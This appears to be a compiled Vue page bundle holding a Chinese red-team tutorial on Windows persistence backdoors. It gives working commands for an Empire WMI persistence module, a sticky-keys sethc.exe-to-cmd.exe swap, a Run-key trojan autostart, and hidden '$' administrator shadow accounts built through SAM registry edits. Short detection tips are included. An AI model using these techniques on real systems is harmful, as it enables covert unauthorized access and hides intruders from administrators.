import{_ as i}from"./_plugin-vue_export-helper.cdc0426e.js";import{o as d,c as t,a as e,b as s,d as n,e as r,r as l}from"./app.b2d7a8da.js";const c={},o=r(`<h2 id="schtasks后门" tabindex="-1"><a class="header-anchor" href="#schtasks后门" aria-hidden="true">#</a> Schtasks后门</h2><p>Schtasks.exe能够在本地或远程计算机上创建，删除，查询，更改，运行和结束计划任务</p><p>不带参数运行Schtasks.exe会显示每个已注册任务的状态和下一次运行时间。</p><h2 id="wmi后门" tabindex="-1"><a class="header-anchor" href="#wmi后门" aria-hidden="true">#</a> wmi后门</h2><p>WMI后门使用了WMI的两个特征：无文件和无进程（需要管理员权限运行）</p><p>原理是将代码加密存储于WMI中，即无文件；调用PowerShell执行后门程序，执行后进程消失，即无进程。</p><p>在Empire中使用Invoke-WMI模块</p><div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code>usemodule powershell/persistence/elevated/wmi  <span class="token comment">#设置参数run</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>检查后门：</p><p>使用微软提供的工具Autoruns：</p>`,10),p={href:"https://docs.microsoft.com/en-us/sysinternals/downloads/autoruns",target:"_blank",rel:"noopener noreferrer"},h=e("h2",{id:"dll劫持后门",tabindex:"-1"},[e("a",{class:"header-anchor",href:"#dll劫持后门","aria-hidden":"true"},"#"),s(" DLL劫持后门")],-1),u=e("p",null,"DLL劫持原理就是使用 loadlibrary 动态加载DLL",-1),m={href:"https://github.com/anhkgg/SuperDllHijack",target:"_blank",rel:"noopener noreferrer"},v=r(`<h2 id="映像劫持shift后门-系统管理员权限" tabindex="-1"><a class="header-anchor" href="#映像劫持shift后门-系统管理员权限" aria-hidden="true">#</a> 映像劫持shift后门(系统管理员权限)</h2><div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code><span class="token comment">#替换sethc.exe为cmd.exe，连按5下Shift弹出cmd窗口</span>
<span class="token builtin class-name">cd</span> C:<span class="token punctuation">\\</span>windows<span class="token punctuation">\\</span>system32
cacls sethc.exe /t /e /G Administrators:f
cacls cmd.exe /t /e /G Administrators:f
ren sethc.exe aaa.exe
ren cmd.exe sethc.exe
 
<span class="token comment">#恢复</span>
ren sethc.exe cmd.exe
ren aaa.exe sethc.exe
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>检查后门：连续按5下弹出cmd窗口（当然还有其它放大镜讲述人等）</p><h2 id="木马加入开机启动项" tabindex="-1"><a class="header-anchor" href="#木马加入开机启动项" aria-hidden="true">#</a> 木马加入开机启动项</h2><div class="language-powershell line-numbers-mode" data-ext="powershell"><pre class="language-powershell"><code><span class="token comment">#使用注册表</span>
reg add HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run <span class="token operator">/</span>v SunRAC <span class="token operator">/</span>t reg_sz <span class="token operator">/</span>d <span class="token string">&quot;C:\\Users\\Public\\Videos\\msservice.exe&quot;</span> 
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div></div></div><h2 id="添加影子账户" tabindex="-1"><a class="header-anchor" href="#添加影子账户" aria-hidden="true">#</a> 添加影子账户</h2>`,6),b={href:"https://github.com/wgpsec/CreateHiddenAccount",target:"_blank",rel:"noopener noreferrer"},_=r(`<div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code>CreateHiddenAccount.exe <span class="token parameter variable">-u</span> teamssix <span class="token parameter variable">-p</span> Passw0rd
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>以下是手动步骤（原理还是要了解的）</p><div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code>net user admins$ @admin.886 /add
net localgroup administrators admins$ /add

<span class="token comment"># &#39;$&#39;符添加时,只是在 net user 中无法查看到当前用户</span>
<span class="token comment"># 而在 net localgroup administrators 中是可以看到的</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h3 id="_1-权限设置" tabindex="-1"><a class="header-anchor" href="#_1-权限设置" aria-hidden="true">#</a> 1）权限设置</h3><p>打开注册表regedit 找到以下键值 <code>HKEY_LOCAL_MACHINE\\SAM\\SAM</code></p><p>右键 SAM 赋予Administrators 完全控制和读取权限，保存后刷新（重新打开注册表）</p><h3 id="_2-导出导入" tabindex="-1"><a class="header-anchor" href="#_2-导出导入" aria-hidden="true">#</a> 2）导出导入</h3><p>进入到以下键值 <code>HKEY_LOCAL_MACHINE\\SAM\\SAM\\Domains\\Account\\Users\\Names</code></p><p>找到添加的用户，还有对应的类型 <strong>0x3eb --&gt;&gt;000003EB</strong>，都进行导出。</p><p>以上两个文件夹都导出之后，将添加的用户删除掉，然后刷新；</p><div class="language-powershell line-numbers-mode" data-ext="powershell"><pre class="language-powershell"><code>net user admins$ <span class="token operator">/</span><span class="token function">del</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p><strong>[+]</strong> 然后导入刚刚导出的两个*.reg文件。</p><h3 id="_4-设置-影子" tabindex="-1"><a class="header-anchor" href="#_4-设置-影子" aria-hidden="true">#</a> 4）设置&quot;影子&quot;</h3><p>找到一个能够正常远程登入的用户，复制它的 F 值，放入到我们添加用户的对应 F 值里面</p><p>RDP连接上去后，就是我们复制 F 值的那个账户的权限</p><h3 id="_5-如何防御" tabindex="-1"><a class="header-anchor" href="#_5-如何防御" aria-hidden="true">#</a> 5）如何防御？</h3><p>1、对于用”$”添加的用户，产看用户组成员</p><div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code>net localgroup administrators
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>2、修改注册表类型的隐藏手段，访问注册表</p><p>HKEY_LOCAL_MACHINE\\SAM\\SAM\\Domains\\Account\\Users\\Names</p>`,20);function g(x,f){const a=l("ExternalLinkIcon");return d(),t("div",null,[o,e("p",null,[e("a",p,[s("https://docs.microsoft.com/en-us/sysinternals/downloads/autoruns"),n(a)])]),h,u,e("p",null,[s("DLL劫持工具："),e("a",m,[s("SuperDllHijack"),n(a)])]),v,e("p",null,[s("自动化工具："),e("a",b,[s("wgpsec/一个使用注册表创建隐藏帐户的工具 "),n(a)])]),_])}const w=i(c,[["render",g],["__file","权限维持-Windows后门.html.vue"]]);export{w as default};
